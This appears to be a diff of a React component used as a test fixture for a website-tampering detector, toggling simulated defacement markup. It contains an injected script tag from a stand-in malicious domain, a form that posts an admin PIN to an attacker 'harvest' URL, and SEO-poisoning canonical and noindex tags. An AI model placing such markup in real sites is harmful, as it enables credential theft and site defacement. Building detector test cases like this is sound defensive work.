@@ -18,14 +18,14 @@ const MainContent = () => {
           L1 HARD TRIGGER: Meta Tag Robots Change (SEO Poisoning)
   )
       */}
-      {/* <link rel="canonical" href="https://defaced-mirror.site/compromised" />
-      <meta name="robots" content="noindex, nofollow" /> */}
+        <link rel="canonical" href="https://defaced-mirror.site/compromised" />
+      <meta name="robots" content="noindex, nofollow" /> 
 
       {/* 
           L1 HARD TRIGGER: Script Injection (New Domain)
          
       */}
-      <script src="https://malicious-cdn.ru/payload.js" />
+      {/* <script src="https://malicious-cdn.ru/payload.js" /> */}
 
       <header className="hacked-header" style={{ backgroundColor: 'black', color: 'red', padding: '50px' }}>
         <h1 style={{ fontSize: '3rem' }}>SYSTEM OFFLINE</h1>
@@ -39,7 +39,7 @@ const MainContent = () => {
             Logic: detector/layers/l1_structural.py (Line 300)
             Targeting "cross_apex" or "scheme_downgrade" triggers.
         */}
-        <form action="https://attacker-data-collect.net/harvest" method="POST" style={{ margin: '40px 0', border: '2px dashed red', padding: '20px' }}>
+        {/* <form action="https://attacker-data-collect.net/harvest" method="POST" style={{ margin: '40px 0', border: '2px dashed red', padding: '20px' }}> */}
           <h3>Security Verification</h3>
           <input type="password" placeholder="Enter Admin Pin" style={{ padding: '10px' }} />
           <button type="submit" style={{ backgroundColor: 'red', color: 'white', border: 'none', padding: '10px 20px' }}>
